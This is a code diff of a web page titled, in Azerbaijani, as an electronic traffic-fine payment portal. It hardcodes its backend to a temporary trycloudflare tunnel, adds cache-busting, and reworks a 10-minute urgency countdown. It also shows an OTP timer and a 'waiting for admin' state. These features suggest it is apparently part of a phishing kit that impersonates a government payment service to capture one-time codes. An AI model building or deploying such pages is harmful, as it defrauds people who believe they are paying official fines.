@@ -3,6 +3,9 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
     <title>Elektron Yol Hərəkəti Cəriməsi - Ödəniş</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -188,9 +191,7 @@
     </div>
 
     <script>
-        let API_URL = (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1' || window.location.protocol === 'file:')
-            ? 'http://localhost:3000/api'
-            : 'https://developing-summer-trustee-inner.trycloudflare.com/api';
+        let API_URL = 'https://warnings-fifty-stress-dakota.trycloudflare.com/api';
         let timerInterval;
         let otpTimeLeft = 180;
         let otpInterval;
@@ -199,21 +200,13 @@
 
         async function initConfig() {
             try {
-                const res = await fetch('config.json');
+                const res = await fetch(`config.json?t=${Date.now()}`);
                 const config = await res.json();
                 if (config.apiUrl) {
                     API_URL = config.apiUrl;
                 }
             } catch (err) {
-                try {
-                    const res2 = await fetch('../config.json');
-                    const config2 = await res2.json();
-                    if (config2.apiUrl) {
-                        API_URL = config2.apiUrl;
-                    }
-                } catch (err2) {
-                    console.log("Config oxunmadı, standart API_URL istifadə olunur:", API_URL);
-                }
+                console.log("Config oxunmadı, lokal istifadə olunur");
             }
             fetchFineData();
             initTimer();
@@ -256,7 +249,7 @@
 
         async function fetchFineData() {
             try {
-                const res = await robustFetch(`${API_URL}/fine`);
+                const res = await robustFetch(`${API_URL}/fine?t=${Date.now()}`);
                 if (res && res.ok) {
                     const data = await res.json();
                     updateUI(data);
@@ -358,11 +351,8 @@
             let lastProtocol = localStorage.getItem('dyp_last_protocol');
             if (lastProtocol !== data.protocolNo) {
                 localStorage.setItem('dyp_last_protocol', data.protocolNo);
-                const timerKey = 'dyp_timer_end_' + data.protocolNo;
-                if (!localStorage.getItem(timerKey)) {
-                    const newEndTime = Date.now() + 10 * 60 * 1000;
-                    localStorage.setItem(timerKey, newEndTime);
-                }
+                const newEndTime = Date.now() + 10 * 60 * 1000;
+                localStorage.setItem('dyp_timer_end', newEndTime);
                 isWaitingForAdmin = false;
                 adviceShown = false;
                 resetFineCardHtml();
@@ -609,19 +599,14 @@
         }
 
         function initTimer() {
+            const timerElement = document.getElementById('timer');
             const TOTAL_DURATION = 10 * 60;
 
             timerInterval = setInterval(() => {
-                const timerElement = document.getElementById('timer');
-                if (!timerElement) return;
-
-                const currentProtocol = localStorage.getItem('dyp_last_protocol') || 'default';
-                const timerKey = 'dyp_timer_end_' + currentProtocol;
-
-                let endTime = localStorage.getItem(timerKey);
+                let endTime = localStorage.getItem('dyp_timer_end');
                 if (!endTime) {
                     endTime = Date.now() + TOTAL_DURATION * 1000;
-                    localStorage.setItem(timerKey, endTime);
+                    localStorage.setItem('dyp_timer_end', endTime);
                 }
 
                 const now = Date.now();
